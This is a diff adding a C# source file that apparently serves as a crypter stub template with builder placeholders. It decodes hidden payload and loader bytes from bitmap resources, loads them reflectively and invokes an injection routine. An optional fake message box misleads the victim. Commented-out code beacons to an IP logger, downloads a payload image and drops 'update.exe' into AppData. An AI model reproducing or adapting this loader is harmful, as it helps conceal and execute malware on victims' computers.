@@ -1,0 +1,218 @@
+﻿using System;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+
+[assembly: AssemblyTitle("[Title]")]
+[assembly: AssemblyDescription("[Description]")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("[Company]")]
+[assembly: AssemblyProduct("[Product]")]
+[assembly: AssemblyCopyright("[Copyright]")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("[Guid]")]
+[assembly: AssemblyVersion("2.3.0.0")]
+[assembly: AssemblyFileVersion("[Version]")]
+
+namespace ConsoleApp
+{
+    class Help
+    {
+       /* public static byte[] Dec(Bitmap img)
+        {
+            StringBuilder ohlred = new StringBuilder();
+            int xmax = img.Width - 1;
+            int ymax = img.Height - 1;
+            for (int y = 1; y <= ymax; y++)
+            {
+                for (int x = 1; x <= xmax; x++)
+                {
+                    Color c = img.GetPixel(x, y);
+                    ohlred.Append((char)c.R);
+                }
+            }
+            string test = ohlred.ToString().Replace(ConvertToChar().ToString(), null);
+            return Convert.FromBase64String(test);
+        }
+        public static char ConvertToChar()
+        {
+            return Convert.ToChar(0);
+        }*/
+
+
+        public static byte[] ConvertFromBmp(Bitmap b)
+        {
+            int l = b.Width;
+
+            int n = l * l * 4;
+
+            byte[] buff = new byte[n];
+
+            int k = 0;
+
+            for (int x = 0; x < l; x++)
+            {
+                for (int y = 0; y < l; y++)
+                {
+
+                    Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(x, y).ToArgb()), 0, buff, k, 4);
+
+                    k += 4;
+                }
+            }
+
+            int len = BitConverter.ToInt32(buff, 0);
+
+            byte[] f = new byte[len];
+
+            Buffer.BlockCopy(buff, 4, f, 0, f.Length);
+
+            return f;
+
+
+        }
+    }
+    class Var
+    {
+        public static ResourceManager rrrrr = new ResourceManager("[resName]", Assembly.Load(File.ReadAllBytes(Application.ExecutablePath)));
+
+        public static byte[] dddd = Help.ConvertFromBmp((Bitmap)rrrrr.GetObject("[fileName]"));
+        public static byte[] ld = Help.ConvertFromBmp((Bitmap)rrrrr.GetObject("[loaderName]"));
+#if FILE
+        public static byte[] AAA2 = Help.Dec((Bitmap)rrrrr.GetObject("[fileName2]"));
+#endif
+    }
+    class Program
+    {
+     
+        /*  public static bool Logger(string adr, string res)
+          {
+              bool result = false;
+              try
+              {
+                  string ipLogLink = adr;
+                  string respon = res;
+
+                  HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(ipLogLink);
+
+                  req.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
+                  req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
+
+                  HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+
+                  using (StreamReader stream = new StreamReader(
+                       resp.GetResponseStream(), Encoding.UTF8))
+                  {
+                      respon = stream.ReadToEnd();
+
+                      if (respon != "" || respon != String.Empty)
+                      {
+                          return result = true;
+                      }
+                  }
+
+              }
+              catch (Exception)
+              {
+                  return result = false;
+              }
+              return result;
+          }*/
+#if FAKE
+        static void Fake()
+        {
+            string message = "[Fake]";
+            string headline = @"[Zagol]";
+            string Txt = @"[TextFake]";
+            switch (message)
+            {
+                case "None":
+
+                    break;
+                case "Information":
+                   // textBox5.Text = Txt;
+                    MessageBox.Show(Txt, headline, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                    break;
+                case "Question":
+                   // textBox5.Text = Txt;
+                    MessageBox.Show(Txt, headline, MessageBoxButtons.OK, MessageBoxIcon.Question);
+                    break;
+                case "Warning":
+                 //   textBox5.Text = Txt;
+                    MessageBox.Show(Txt, headline, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    break;
+                case "Error":
+                 //   textBox5.Text = Txt;
+                    MessageBox.Show(Txt, headline, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    break;
+            }
+        }
+#endif
+
+        /* static ResourceManager serr = new ResourceManager("[resName]", Assembly.Load(File.ReadAllBytes(Application.ExecutablePath)));
+
+         static byte[] gmi = HH.Dec((Bitmap)serr.GetObject("[fileName]"));
+         static byte[] dlfs = HH.Dec((Bitmap)serr.GetObject("[loaderName]"));*/
+        static void Main(string[] args)
+        {
+
+
+            /*    string dll = @"http://i.imgur.com/4wuH1Y7.png"; // No Startup     
+                var requestLoader = WebRequest.Create(dll);
+                Bitmap iiimg;
+                using (var response = requestLoader.GetResponse())
+                using (var stream = response.GetResponseStream())
+                {
+                    iiimg = (Bitmap)Image.FromStream(stream);
+
+                }
+                byte[] llllll = HH.Dec(iiimg);*/
+            string i = "[inject]";
+            Console.WriteLine(i);
+            string l = "Program.lol";
+            string p = "pprr";
+            Console.WriteLine(l + p);
+            Assembly.Load(Var.ld).GetType(l).GetMethod(p).Invoke(null, new object[] { Var.dddd, i });// https://iplogger.org/1QMn67
+
+            // Logger("https://iplogger.org/1QMn67", "log");
+
+#if FAKE
+                Fake();
+#endif
+
+
+
+
+
+
+
+
+#if FILE
+         
+                   
+                    System.Reflection.Assembly.Load(Var.ld).GetType("Program.lol").GetMethod("pprr").Invoke(null, new object[] { Var.AAA2, "[inject]" });
+                 //   string pazt = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\update.exe";
+                  // File.WriteAllBytes(pazt, AAA2);
+                  //  System.Diagnostics.Process.Start(pazt);
+               
+#endif
+
+
+
+
+
+
+        }
+
+
+    }
+
+}
